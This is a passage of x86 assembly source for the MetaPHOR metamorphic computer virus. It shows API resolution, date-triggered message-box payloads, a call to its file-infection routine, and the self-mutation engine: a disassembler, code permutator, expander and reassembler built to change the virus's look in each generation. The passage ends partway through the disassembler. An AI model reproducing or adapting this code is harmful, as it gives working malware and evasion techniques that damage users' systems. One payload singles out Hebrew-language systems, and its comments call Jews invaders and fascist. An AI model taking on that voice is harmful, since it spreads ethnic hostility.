                mov     [ebp+RVA_SetEndOfFile], eax

                mov     eax, 'dniF'
                mov     [edx], eax
                mov     eax, 'sriF'
                mov     [edx+4], eax
                mov     eax, 'liFt'
                mov     [edx+8], eax
                mov     eax, 'Ae'
                mov     [edx+0Ch], eax
                call    GetFunction   ; Get FindFirstFileA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_FindFirstFileA], eax

                mov     eax, 'txeN'
                mov     [edx+4], eax
                mov     eax, 'eliF'
                mov     [edx+8], eax
                mov     eax, 'A'
                mov     [edx+0Ch], eax
                call    GetFunction   ; Get FindNextFileA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_FindNextFileA], eax

                mov     eax, 'solC'
                mov     [edx+4], eax
                mov     eax, 'e'
                mov     [edx+8], eax
                call    GetFunction   ; Get FindClose
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_FindClose], eax

                add     edx, 4
                mov     eax, 'dnaH'
                mov     [edx+5], eax
                mov     eax, 'el'
                mov     [edx+9], eax
                call    GetFunction   ; Get CloseHandle
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_CloseHandle], eax

                sub     edx, 4
                mov     edi, [ebp+hUser32] ; Maybe NULL, but it's allowed by
                mov     eax, 'sseM'        ; GetProcAddress
                mov     [edx], eax
                mov     eax, 'Bega'
                mov     [edx+4], eax
                mov     eax, 'Axo'
                mov     [edx+8], eax
                call    GetFunction   ; Get MessageBoxA (from User32.DLL)
                mov     [ebp+RVA_MessageBoxA], eax ; 0 if not found or library
                                                   ; not loaded

;; Let's initialize the random seed
                push    eax
                push    ecx
                push    edx ; APICALL_BEGIN

                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp
                push    eax
                call    dword ptr [ebp+RVA_GetSystemTime]

                pop     edx
                pop     ecx
                pop     eax ; APICALL_END

                mov     ebx, [ebp+_BUFFER1_SECTION]
                add     ebx, ebp
                mov     eax, [ebx+04h]
                add     eax, [ebx+0Ch]
                mov     [ebp+RndSeed1], eax
                add     eax, [ebx+08h]
                mov     [ebp+RndSeed2], eax

                call    Random
                call    Random  ; Garble it a little

   ;; Now let's make some mixtures in the weights. Since the weights are
   ;; going to be hardcoded on the virus code before its use, we make here
   ;; some "garblement" to force the evolution of the infection methods. With
   ;; this, only the most powerful features will "survive".

                xor     ecx, ecx
          @@LoopGarbleWeights:
                push    ecx
                and     ecx, 3
                mov     eax, ecx
                call    RandomBoolean_X000_3
                mov     eax, ecx
                call    RandomBoolean_X004_7
                mov     eax, ecx
                call    RandomBoolean_X008_11
                mov     eax, ecx
                call    RandomBoolean_X012_15
                mov     eax, ecx
                call    RandomBoolean_X016_19
                mov     eax, ecx
                call    RandomBoolean_X020_23
                pop     ecx
                add     ecx, 1
                cmp     ecx, 40h
                jnz   @@LoopGarbleWeights


                mov     eax, [ebp+RVA_MessageBoxA]
                or      eax, eax
                jz    @@NoPayload      ; If we couldn't retrieve MessageBoxA,
                                       ; skip the payload

;; Payload
;;---------
;; Simple, silly MessageBox with a metamorphic message :)
;; The message is "MetaPHOR v1 by The Mental Driller/29A" but selecting
;;  randomly the case of all letters.

                mov     edx, [ebp+_BUFFER1_SECTION]
                add     edx, ebp
                mov     eax, [edx+2]
                and     eax, 0FFh
                cmp     eax, 3           ; Month: March, June, September or
                jz    @@Payload_Month    ;    December
                cmp     eax, 6
                jz    @@Payload_Month
                cmp     eax, 9
                jz    @@Payload_Month
                cmp     eax, 0Ch
                jnz   @@CheckPayload2
       @@Payload_Month:
                mov     eax, [edx+6]
                and     eax, 0FFh
                cmp     eax, 11h         ; Day: 17
                jnz   @@CheckPayload2

                push    edx
                call    Random
                and     eax, 20202020h   ;; All the phrase is:
                add     eax, 'ATEM'      ;; "META"
                mov     [edx], eax       
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ROHP'      ;; "PHOR"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00200000h
                add     eax, ' B1 '      ;; " v1 "
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20002020h
                add     eax, 'T YB'      ;; "BY T"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20002020h
                add     eax, 'M EH'      ;; "HE M"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ATNE'      ;; "ENTA"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20200020h
                add     eax, 'RD L'      ;; "L DR"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 20202020h
                add     eax, 'ELLI'      ;; "ILLE"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 00000020h
                add     eax, '92/R'      ;; "R/29"
                mov     [edx], eax
                add     edx, 4
                call    Random
                and     eax, 0FFFF0020h
                add     eax, 'A'         ;; "A"
                mov     [edx], eax
                pop     edx
                                  ; "METAPHOR v1 BY THE MENTAL DRILLER/29A"
                push    eax       ; with random upcases and lowcases.
                push    ecx
                push    edx  ; APICALL_BEGIN

                xor     eax, eax
                push    eax
                mov     eax, edx
                push    eax
                push    eax
                xor     eax, eax
                push    eax
                call    dword ptr [ebp+RVA_MessageBoxA]

                pop     edx
                pop     ecx
                pop     eax
                jmp   @@EndPayload


 ; Not so-silly 2nd part of the payload.
 ; We get the system language and, if it's hebrew, we show a message box with
 ; the message "Free Palestine!", my little contribution against the illegal
 ; occupation performed by the jews and supported by EEUU. The message will
 ; show on 14 May, the day that the state of Israel was declarated.
 ; Notice that I'm not supporting organizations like Hamas or shit like that,
 ; but it's true that jews began the war stealing the Palestinian home to
 ; the Palestinian People. Anyway, killing people is not the solution
 ; (wherever the side of the conflict they are in).


   @@CheckPayload2:
                mov     eax, [edx+2]
                and     eax, 0FFh
                cmp     eax, 5  ; May
                jnz   @@NoPayload
                mov     eax, [edx+6]
                and     eax, 0FFh
                cmp     eax, 0Eh ; 14th
                jnz   @@NoPayload                

                push    eax
                push    ecx
                push    edx
                call    dword ptr [ebp+RVA_GetSystemDefaultLCID]
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax

                mov     eax, [ebp+ReturnValue]
                and     eax, 0FFFFh
                cmp     eax, 040Dh    ; System language: hebrew?
                jnz   @@NoPayload


                push    edx
                mov     eax, 'eerF'
                mov     [edx], eax
                add     edx, 4
                mov     eax, 'laP '
                mov     [edx], eax
                add     edx, 4
                mov     eax, 'itse'
                mov     [edx], eax
                add     edx, 4
                mov     eax, '!en'    ; Show our disconformity with jewish
                mov     [edx], eax    ; invasion of Palestine and all their
                pop     edx           ; fascist acting up to date (in a
                                      ; peaceful way)

                push    eax
                push    ecx
                push    edx
                xor     eax, eax
                push    eax
                mov     eax, edx
                push    eax
                push    eax
                xor     eax, eax
                push    eax
                call    dword ptr [ebp+RVA_MessageBoxA]
                pop     edx
                pop     ecx
                pop     eax

   @@EndPayload:
   @@NoPayload:


;; Now we are going to get random frames for variables, dissasembly, etc. for
;; the next generation usage. These variables must be passed "from the
;; outside" (as parameters from the loader/decryptor).
;;
;; Sizes of frames:
;; CODE_SECTION      =  80000h
;; DISASM_SECTION    = 100000h
;;    LABEL_SECTION     =  10000h +
;;    VARIABLE_SECTION  =  10000h +
;;    BUFFER1_SECTION   =  10000h +
;;    BUFFER2_SECTION   =  10000h +
;;    VAR_MARKS_SECTION =  20000h =
;; BUFFERS_SECTION   =  60000h
;; DATA_SECTION      =  20000h
;; DISASM2_SECTION   = 100000h
;;                 -----------
;;                     300000h
;; We always reserve 3'4 Mb of virtual memory at least, so we can add a random
;; shifting up to 256 Kb (40000h bytes)

                mov     esi, [ebp+_DISASM_SECTION]
                add     esi, ebp
                xor     eax, eax  ; Let's fabricate a random permutation of
                push    esi       ; the sequence 0,1,2,3,4,5. 
      @@LoopGarbleSect_01:
                mov     ebx, eax
                add     eax, 1
                mov     ecx, eax
                add     eax, 1
                mov     edx, eax
                add     eax, 1
                push    eax
                call    Xp_GarbleRegisters ; Garble EBX, ECX and EDX
                pop     eax
                mov     [esi], ebx
                mov     [esi+4], ecx
                mov     [esi+8], edx  ; Store the garbled sequence
                add     esi, 0Ch
                cmp     eax, 6
                jnz   @@LoopGarbleSect_01 ; Repeat it again (get 4,5,6)

                pop     esi
                push    esi
                mov     ecx, 2   ; Now garble the <0,1,2> with the <3,4,5>
      @@LoopGarbleSect_02:
                push    ecx
                mov     ebx, [esi]      ; Get value at position 0,2,4 and
                mov     ecx, [esi+08h]  ; garble it
                mov     edx, [esi+10h]
                call    Xp_GarbleRegisters
                mov     [esi], ebx
                mov     [esi+08h], ecx
                mov     [esi+10h], edx  ; Store the shuffling
                pop     ecx
                add     esi, 4
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopGarbleSect_02 ; Make it with positions 1,3,5
                pop     esi

                mov     ecx, 6
                xor     edx, edx   ; Initialize adder
      @@LoopGarbleSect_03:
                call    Random
                and     eax, 7FFFh ; *5 = 40000h ; Add a random shifting
                add     edx, eax

                mov     eax, [esi]
                or      eax, eax               ; 0?
                jz    @@GarbleSect_CodeSection ; Then set CODE_SECTION address
                cmp     eax, 1                   ; 1?
                jz    @@GarbleSect_DisasmSection ; Then, DISASM_SECTION
                cmp     eax, 2
                jz    @@GarbleSect_BuffersSection ; 2: BUFFERS_SECTION
                cmp     eax, 3
                jz    @@GarbleSect_DataSection   ; 3: DATA_SECTION
                cmp     eax, 4
                jnz   @@GarbleSect_Next          ; 4: DISASM2_SECTION
      @@GarbleSect_Disasm2Section:
                mov     [ebp+New_DISASM2_SECTION], edx
                add     edx, 100000h      ; Add size of section to adder
                jmp   @@GarbleSect_Next
      @@GarbleSect_CodeSection:
                mov     [ebp+New_CODE_SECTION], edx
                add     edx, 80000h       ; Add size of section to adder
                jmp   @@GarbleSect_Next
      @@GarbleSect_DisasmSection:
                mov     [ebp+New_DISASM_SECTION], edx
                add     edx, 100000h      ; Add size of section to adder
                jmp   @@GarbleSect_Next
      @@GarbleSect_BuffersSection:
                mov     [ebp+New_BUFFERS_SECTION], edx
                add     edx, 60000h       ; Add size of section to adder
                jmp   @@GarbleSect_Next
      @@GarbleSect_DataSection:
                mov     [ebp+New_DATA_SECTION], edx
                add     edx, 20000h       ; Add size of section to adder
      @@GarbleSect_Next:
                add     esi, 4
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopGarbleSect_03


;; Now we can start with the selfmutation

;; Disassembler:
;;
;; It disassembles the code starting at ESI (entrypoint) to a pseudoassembler
;; that is easier to handle. This pseudoassembler will be used along the
;; mutation instead of the direct machine code.

                mov     eax, [ebp+_DISASM_SECTION]
                add     eax, ebp                    ; Set the address of
                mov     [ebp+InstructionTable], eax ; the instruction table
                mov     eax, [ebp+_LABEL_SECTION]
                add     eax, ebp                    ; Address of the label
                mov     [ebp+LabelTable], eax       ; table
                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp                    ; Temporary table for the
                mov     [ebp+FutureLabelTable], eax ; storadge of labels
                mov     eax, [ebp+_DISASM2_SECTION]
                add     eax, ebp                    ; Temporary buffer to mark
                mov     [ebp+PathMarksTable], eax   ; the path of the code

                mov     esi, [ebp+_CODE_SECTION]
                add     esi, ebp                ; ESI = Start of code
                call    DisasmCode              ; Disassemble  the code
                nop     ; NOP for debugging: Place for the debugger to put the
                        ; INT 3. It will be eliminated by the disassembler,
                        ; since all the one-byte instructions such CLC, INT 3,
                        ; etc. are NOPed
                ; It returns EDI = Address of last instruction

                mov     [ebp+AddressOfLastInstruction], edi ; Set last instr.


;; Shrinker
;;
;; It compresses all the redundancies and obfuscations that the expander did
;; in previous generations.

                call    ShrinkCode  ; Compress the code

;; Variable identificator:
;;
;; It scans the code to get instructions that use memory addresses and then
;; it converts them to a reference to a table of variables. After this, we
;; reselect the addresses of the variables.

                mov     eax, [ebp+_VARIABLE_SECTION]
                add     eax, ebp                  ; Set the address to the
                mov     [ebp+VariableTable], eax  ; table of variables
                mov     eax, [ebp+_VAR_MARKS_SECTION]
                add     eax, ebp                  ; Set the buffer that marks
                mov     [ebp+VarMarksTable], eax  ; the variables positions
                                                  ; to know if a given address
                                                  ; is already in the table
                                                  ; or it's a free address
                mov     ecx, [ebp+DeltaRegister] ; The delta register is used
                                                 ; to know what is an internal
                                                 ; variable and what's not
                call    IdentifyVariables  ; Identfy them and construct the
                                           ; table of variables

;; Code permutator
;;
;; It shuffles the code and insert jumps between to link the moved blocks,
;; updating also all the labels to point to the new location.

                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp               ; Temporary buffer to construct
                mov     [ebp+FramesTable], eax ; the permutation frames
                mov     eax, [ebp+_DISASM2_SECTION]
                add     eax, ebp                     ; Place where we store
                mov     [ebp+PermutationResult], eax ; the permutated code
                mov     eax, [ebp+_BUFFER2_SECTION]
                add     eax, ebp               ; Buffer to store jumps to fix
                mov     [ebp+JumpsTable], eax  ; while permutating
                call    PermutateCode
                                  ; Permutate the code (in pseudoassembler)

                ; Returns [AddressOfLastInstruction] updated to point to the
                ; last instruction + 10h in [PermutationResult] address
                mov     eax, [ebp+PermutationResult]
                mov     [ebp+InstructionTable], eax ; Set the new instr. table

;; Code expander
;;
;; It generates alternatives for every instruction coded in our pseudo-ASM.
;; It's generated in a way that we only have to code every instruction
;; directly to have a very different look of the previous program, but keeping
;; the functionality unchanged. It also translates all registers into new
;; ones (except ESP, of course).

                xor     eax, eax                   ; Tell the expander that
                mov     [ebp+CreatingADecryptor], eax ; we are mutating the
                                                      ; virus body
                mov     eax, [ebp+_DISASM_SECTION]
                add     eax, ebp              ; Set the destiny address of the
                mov     [ebp+ExpansionResult], eax  ; expansion/obfuscation
                xor     eax, eax                     ; Set the recursivity
                mov     [ebp+SizeOfExpansion], eax   ; to 3 (from 0 to 3)
                call    XpandCode             ; Redo all instructions

                ; Returns [AddressOfLastInstruction] updated

;; Code assembler
;;
;; It assembles the code previously obfuscated and expanded by the expander

                mov     eax, [ebp+ExpansionResult]
                mov     [ebp+InstructionTable], eax  ; _DISASM_SECTION
                mov     eax, [ebp+_DISASM2_SECTION]
                add     eax, ebp                     ; Set the address where
                mov     [ebp+NewAssembledCode], eax  ; the reassembling result
                                                     ; will be stored
                mov     eax, [ebp+_VARIABLE_SECTION]
                add     eax, ebp                     ; Use this address for
                mov     [ebp+NewLabelTable], eax     ; temporary storadge
                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp                       ; Another buffer for
                mov     [ebp+JumpRelocationTable], eax ; temporary storadge
                call    AssembleCode         ; Convert the code to x86

;; Here we have:
;; [NewAssembledCode] = _DISASM2_SECTION = New code
;; [SizeOfNewCode] = Size of new code (oh, no! really??? :)
;; [RoundedSizeOfNewCode] = Size of new code rounded to pages (4 Kb)
;; From now, every section is free except CODE_SECTION, DATA_SECTION and
;;   DISASM2_SECTION.

;; Now let's make the action that gives this program the attribute of a
;; computer virus: INFECT

                mov     eax, [ebp+_DISASM_SECTION]
                add     eax, ebp                       ; Code the decryptor
                mov     [ebp+DecryptorPseudoCode], eax ; here in pseudo-asm
                add     eax, 80000h
                mov     [ebp+AssembledDecryptor], eax  ; Assemble it here

                mov     eax, [ebp+_BUFFER2_SECTION]
                add     eax, ebp                  ; Temporary buffer for the
                mov     [ebp+FindFileData], eax   ; FindFile functions
                mov     eax, [ebp+_BUFFER1_SECTION]
                add     eax, ebp                  ; Buffer for several
                mov     [ebp+OtherBuffers], eax   ; actions
                call    InfectFiles    ; Infect!
      @@Error:
                ret             ; Return to the host and finish
Main            endp

;; Function to get the address of the module passed in ASCII. It will convert
;; the string to UNICODE if the GetModuleHandle function is GetModuleHandleW.

APICall_GetModuleHandle proc
                mov     eax, [ebp+FlagAorW] ; Get A or W
                or      eax, eax            ; A?
                jz    @@UseGMHA             ; Then, use the string as is
                mov     ebx, edx
                add     ebx, 20h    ; Go to the end of the string buffer (W)
                mov     ebx, edx
                add     ecx, 10h    ; Go to the end of the string buffer (A)
    @@LoopConvertToWideChar:
                mov     eax, [ecx]  ; Get a letter
                and     eax, 0FFh   ; Make it zero-extended (in words)
                mov     [ebx], eax  ; Store it
                sub     ecx, 1      ; Decrease the ASCII address in 1
                sub     ebx, 2      ; Decrease the UNICODE address in 2
                cmp     ecx, edx    ; Are we at the end of the buffer
                jnz   @@LoopConvertToWideChar  ; If not, loop again
    @@UseGMHA:  push    edx                     ; Store parameter
                call    dword ptr [ebp+RVA_GetModuleHandle] ; Call the API
                mov     [ebp+ReturnValue], eax  ; Store the module handle
                ret
APICall_GetModuleHandle endp

; EDI = Handle of module
; EDX = Buffer where we have the function name
GetFunction     proc
                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                mov     eax, edx  ; We do this to avoid many continuous PUSHes
                push    eax       ; Store function name and module handle
                mov     eax, edi
                push    eax
                call    dword ptr [ebp+RVA_GetProcAddress]  ; Call API
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END
                mov     eax, [ebp+ReturnValue] ; Get the function address
                ret
GetFunction     endp

;; KEYWORD: Key_!Disassembler
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; *********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The disassembler
;; ----------------
;;
;; The disassembler is the module that converts the machine code into our
;; pseudo-assembler in the addresses we gave it.
;;
;; The codification of every instruction of the generated pseudo-assembler
;; is as follows (extracted from the article I wrote about metamorphism and
;; this engine):
;;
;; ---------------------------------------------------------------------------
;;
;; The MetaPHOR internal pseudo-assembler follows the next rules:
;;
;;     a) All the instructions are 16-bytes long (but this can change in the
;;      future to handle 64-bits processors, like the Itanium).
;;
;;     b) The structure of the instruction is always the same for all them:
;;
;;        General structure:
;;
;;        16 bytes per instruction,
;;
;;        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
;;        OP *----- instruction data ----* LM *-pointer-*
;;
;;        OP is the opcode of the instruction. Depending on the opcode we use
;;         an instruction data structure or other.
;;
;;        LM is "Label Mark". Its value is 1 when a label is pointing to this
;;         instruction, and can be used for quite things, for example to know
;;         if two instructions can be shrinked or not (they can't if the second
;;         one has a label over it). It's at +0B in the instruction.
;;
;;        The dword at +0C is a pointer that means "last code reference". On
;;        disassembly this means the EIP where this instruction is pointing to
;;        its original codification, but while we are advancing in the code
;;        treatment we store here references to the last situation of the
;;        instruction. This helps to make modifications to the table of labels,
;;        to recode the displacement instructions (JMP, CALL, etc.) and more.
;;
;;
;;       Now the structures that the engine uses in the instructions:
;;
;;        Memory_address_struct:
;;           +01: First index
;;           +02: Second index, bits 7&6 are the multiplicator (00=*1,01=*2,
;;                                                              10=*4,11=*8)
;;           +03: DWORD addition to indexes
;;
;;
;;
;;        Depending on the opcode (the operation to perform), the following
;;        means:
;;
;;        - If operation has no operand (NOP, RET, etc). nothing in the instr.
;;         data is performed
;;
;;        - If operation has one operand:
;;
;;           Register operand:
;;              +01: Register
;;
;;           Memory address:
;;              +01: Memory address struct
;;
;;           Immediate value:
;;              +07: DWORD value, zero extended if it's a byte operation
;;
;;           Destiny address (JMP, CALL, etc.)
;;              +01: Label to jump to (DWORD)
;;
;;        - If operation has two operands:
;;
;;           Reg,Imm:
;;              +01: Register
;;              +07: DWORD immediate value, zero extended if it's a 8-bits op.
;;
;;           Reg,Reg:
;;              +01: Source register
;;              +07: Destiny register
;;
;;           Reg,Mem:
;;              +01: Memory address struct
;;              +07: Destiny register
;;
;;           Mem,Reg:
;;              +01: Memory address struct
;;              +07: Source register
;;
;;           Mem,Imm:
;;              +01: Memory address struct
;;              +07: DWORD immediate value, zero extended if it's a 8-bits op.
;;
;;
;;  From this rules, now we use the next pseudo-opcodes:
;;
;;    00: ADD, 08: OR, 20: AND, 28: SUB, 30: XOR, 38: CMP, 40: MOV, 48: TEST
;;
;;    Set rules: +00: Reg,Imm
;;               +01: Reg,Reg
;;               +02: Reg,Mem
;;               +03: Mem,Reg
;;               +04: Mem,Imm
;;               +80: 8 bits operation
;;
;;    So, opcode 83 means ADD Mem,Reg using 8-bits operands, and so on.
;;
;;    50: PUSH Reg
;;    51: PUSH Mem
;;    58: POP Reg
;;    59: POP Mem
;;    68: PUSH Imm
;;    70-7F: Conditional jumps
;;    E0: NOT Reg
;;    E1: NOT Mem
;;    E2: NOT Reg8
;;    E3: NOT Mem8
;;    E4: NEG Reg
;;    E5: NEG Mem
;;    E6: NEG Reg8
;;    E7: NEG Mem8
;;    E8: CALL label
;;    E9: JMP label
;;    EA: CALL Mem (used for API calls)
;;    EB: JMP Mem (used for obfuscation in API calls)
;;    EC: CALL Reg (obfuscation of API calls)
;;    ED: JMP Reg (idem)
;;
;;    F0: SHIFT Reg,Imm
;;    F1: SHIFT Mem,Imm
;;    F2: SHIFT Reg8,Imm
;;    F3: SHIFT Mem8,Imm
;;        For all SHIFTs:
;;        +07: Byte with the value of rotation/shifting
;;        +08: Operation performed: 0: ROL, 8: ROR, 20: SHL, 28: SHR
;;    F4: APICALL_BEGIN
;;        Special operation meaning PUSH EAX/PUSH ECX/PUSH EDX that avoids
;;        the recoding of these registers, always remaining the same.
;;    F5: APICALL_END
;;        The complementary of APICALL_BEGIN, it means POP EDX/POP ECX/POP EAX
;;    F6: APICALL_STORE
;;        +01: Memory address struct
;;        This always means: MOV [Mem],EAX <-- Avoiding the recoding of EAX
;;    F7: SET_WEIGHT
;;        +01: Memory address struct
;;        +07: Weight item identificator
;;        +08: Register 1
;;        +09: Register 2
;;    F8: MOVZX
;;        Memory address struct is a 8-bits operand, while +07 is a 32 bit reg.
;;    FC: LEA
;;    FE: RET
;;    FF: NOP
;; ---------------------------------------------------------------------------
;;
;; The decodification, as you will see, it's not arbitrary, I mean, there
;; is a reason for every format of decodification in every instruction.
;; Although many times the format is in that way due to thinking on simplicity,
;; other times I changed the format to make code reduction easier.

;;  ESI = Start of code to dissasemble
DisasmCode      proc
                xor     eax, eax
                mov     [ebp+NumberOfLabels], eax  ; Initialize the number of
                mov     [ebp+NumberOfLabelsPost], eax ; labels and the number
                                                      ; of buffered labels
                mov     ecx, 80000h/4       ; Initialize the path marks
                mov     edi, [ebp+PathMarksTable]
                xor     eax, eax
      @@LoopInitializePathTable:
                mov     [edi], eax       ; Fill all the buffers with 0
                add     edi, 4
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopInitializePathTable

                mov     edi, [ebp+InstructionTable]

  ;; Let's disassemble the given code address (ESI) into the buffer where we
  ;;construct the whole code in pseudoassembler (EDI)
      @@LoopTrace:
      @@CheckCurrentLabel:
                mov     eax, esi        ; Check if the current code is already
                sub     eax, [ebp+_CODE_SECTION]   ; disassembled
                sub     eax, ebp
                add     eax, [ebp+PathMarksTable]
                mov     eax, [eax]      ; If the mark in the path is != 0,
                and     eax, 0FFh       ; then it's already disassembled.
                cmp     eax, 1
                jnz   @@CheckIfFutureLabelArrived

   ;; If it's already disassembled, it's because the current code is inside
   ;; a loop, or is referenced by a label that we disassembled before. So, we
   ;; find the referenced code and we insert a JMP to there, and after that we
   ;; get a new EIP from the list of "future labels".
                mov     edx, [ebp+InstructionTable] ; Get the first instruction
        @@CheckCurrEIP_001:
                mov     eax, [edx+0Ch]   ; Search the pointer at all the
                cmp     eax, esi         ; disassembled instructions. When we
                jz    @@ItsTheCurrentEIP ; find it, we'll insert a JMP to that
                add     edx, 10h         ; instruction.
                jmp   @@CheckCurrEIP_001
        @@ItsTheCurrentEIP:
                mov     [edi+0Ch], esi  ; Set the new pointer.
                mov     eax, [edi+0Bh]  ; Get the label mark.
                and     eax, 0FFFFFF00h ; Clear it.
                mov     [edi+0Bh], eax
                mov     eax, 0E9h       ; Set the JMP to the already
                mov     [edi], eax      ; disassembled code
                mov     eax, esi
                mov     ebx, edx        ; Insert the label
                call    InsertLabel
                mov     [edi+1], edx
                add     edi, 10h        ; Increment the EIP

     ; Now get a new EIP to disassemble.
                mov     ecx, [ebp+NumberOfLabelsPost] ; Get the number of
                or      ecx, ecx  ; labels. If it's 0, we haven't more branches
                jz    @@FinDeTraduccion ; to disassemble, so we finish and
                                        ; return.
                mov     ebx, [ebp+FutureLabelTable] ; Get the table address
      @@LoopCheckOtherFutureLabel:      ; Look for a not disassembled label
                mov     eax, [ebx]
                cmp     eax, esi
                jz    @@OtherFutureLabelFound
      @@LoopSearchOtherFutureLabel:
                add     ebx, 8
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopCheckOtherFutureLabel
                                       ; Now we have a new EIP in ESI
                mov     ecx, [ebp+NumberOfLabelsPost]
                mov     ebx, [ebp+FutureLabelTable]
      @@LoopCheckOtherFutureLabel2:
                mov     eax, [ebx]     ; Check the other labels at the table.
                or      eax, eax       ; If we found one already disassembled,
                jz    @@LoopSearchOtherFutureLabel2 ; we eliminate it from the
                sub     eax, ebp       ; list and insert the new label in the
                sub     eax, [ebp+_CODE_SECTION]   ; table of definitive
                add     eax, [ebp+PathMarksTable]  ; labels.
                mov     eax, [eax]
                and     eax, 0FFh
                cmp     eax, 1
                jz    @@ReleaseLabelsInThatAddress
      @@LoopSearchOtherFutureLabel2:
                add     ebx, 8
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopCheckOtherFutureLabel2
                jmp   @@GetEIPFromFutureLabelList

       @@ReleaseLabelsInThatAddress:
                push    ebx            ; Release the label. This means store
                push    ecx            ; the labels already disassembled in the
                mov     esi, [ebx]     ; definitive label table, and all that.
                call    ReleaseFutureLabels ; It checks the current EIP in ESI.
                pop     ecx
                pop     ebx
                jmp   @@LoopSearchOtherFutureLabel2

        @@OtherFutureLabelFound:
                mov     eax, [ebx+4]    ; Set the label at the JUMP or
                mov     [eax+1], edx    ; displacement instruction
                xor     eax, eax
                mov     [ebx], eax      ; Eliminate the label from the future
                jmp   @@LoopSearchOtherFutureLabel ; label list

     @@CheckIfFutureLabelArrived:
                mov     eax, [edi+0Bh]  ; Clear the label mark...
                and     eax, 0FFFFFF00h
                mov     [edi+0Bh], eax
                call    ReleaseFutureLabels ; ...and release the temporary
                                            ; labels
      @@SigueInstr:
                mov     [edi+0Ch], esi  ; Set the current EIP at the pointer
                mov     ebx, esi        ; field.
                sub     ebx, [ebp+_CODE_SECTION]
                sub     ebx, ebp
                add     ebx, [ebp+PathMarksTable]
                mov     eax, [ebx]
                or      eax, 1
                mov     [ebx], eax      ; Mark address as already decoded

                mov     eax, [esi]      ; Get the opcode
                and     eax, 0FFh
                cmp     eax, 3Fh       ; OP Reg,Reg, Mem,Reg or Reg,Mem?
                jbe   @@GenericOpcode
                cmp     eax, 47h       ; INC Reg?
                jbe   @@Op_INC
                cmp     eax, 4Fh       ; DEC Reg?
                jbe   @@Op_DEC
                cmp     eax, 5Fh       ; PUSH Reg/POP Reg?
                jbe   @@Op_PUSHPOP
                cmp     eax, 68h       ; PUSH Imm?
                jz    @@Op_PUSHValue
                cmp     eax, 6Ah       ; PUSH sign-extended Imm?
                jz    @@Op_PUSHSignedValue
                cmp     eax, 70h       ; Short conditional jump?
                jb    @@SigueInstr_00
                cmp     eax, 7Fh
                jbe   @@Jcc
       @@SigueInstr_00:
                cmp     eax, 80h       ; Reg,Imm or Mem,Imm?
                jb    @@SigueInstr_01
                cmp     eax, 83h
                jbe   @@GenericOpcode2
       @@SigueInstr_01:
                cmp     eax, 84h        ; TEST
                jz    @@Gen_8b_MemReg
                cmp     eax, 85h        ; TEST
                jz    @@Gen_32b_MemReg
;                 cmp     eax, 86h        ; XCHG
;                 jz    @@Gen_8b_MemReg
;                 cmp     eax, 87h        ; XCHG
;                 jz    @@Gen_32b_MemReg
                cmp     eax, 8Bh        ; MOV?
                jbe   @@GenericOpcode
                cmp     eax, 8Dh        ; LEA
                jz    @@LEA
                cmp     eax, 8Fh        ; POP Mem?
                jz    @@POPMem
                cmp     eax, 90h        ; NOP?
                jz    @@NOP
;                 cmp     eax, 97h      ; Disabled instructions
;                 jbe   @@XCHGWithEAX
;                 cmp     eax, 0A0h
;                 jz    @@MOVALMem
;                 cmp     eax, 0A1h
;                 jz    @@MOVEAXMem
;                 cmp     eax, 0A2h
;                 jz    @@MOVMemAL
;                 cmp     eax, 0A3h
;                 jz    @@MOVMemEAX
                cmp     eax, 0A8h       ; TEST AL,xx?
                jz    @@TESTALValue
                cmp     eax, 0A9h       ; TEST EAX,xx?
                jz    @@TESTEAXValue
                cmp     eax, 0B0h       ; MOV Reg8,xx?
                jb    @@SigueInstr_02
                cmp     eax, 0B7h
                jbe   @@MOVReg8Value
                cmp     eax, 0BFh       ; MOV Reg,xxx?
                jbe   @@MOVRegValue
       @@SigueInstr_02:
                cmp     eax, 0C0h       ; SHIFT,1? (ROL,ROR,etc. with 8 bits)
                jz    @@BitShifting8
                cmp     eax, 0C1h       ; SHIFT,1 with 32 bits?
                jz    @@BitShifting32
                cmp     eax, 0C3h       ; RET?
                jz    @@RET
                cmp     eax, 0C6h       ; MOV Mem8,Imm?
                jz    @@MOVMem8Value
                cmp     eax, 0C7h       ; MOV Mem,Imm?
                jz    @@MOVMem32Value
                cmp     eax, 0D0h       ; SHIFT,x with 8 bits?
                jz    @@BitShifting8
                cmp     eax, 0D1h       ; SHIFT,x with 32 bits?
                jz    @@BitShifting32

        ;; In this gap there are obsolete instructions, copro ones and
        ;; other that we aren't going to use (for the moment), so decode
        ;; them it's not worthy.

                cmp     eax, 0E8h       ; CALL?
                jz    @@CALL
                cmp     eax, 0E9h       ; Long JMP?
                jz    @@JMP
                cmp     eax, 0EBh       ; Short JMP?
                jz    @@JMP8
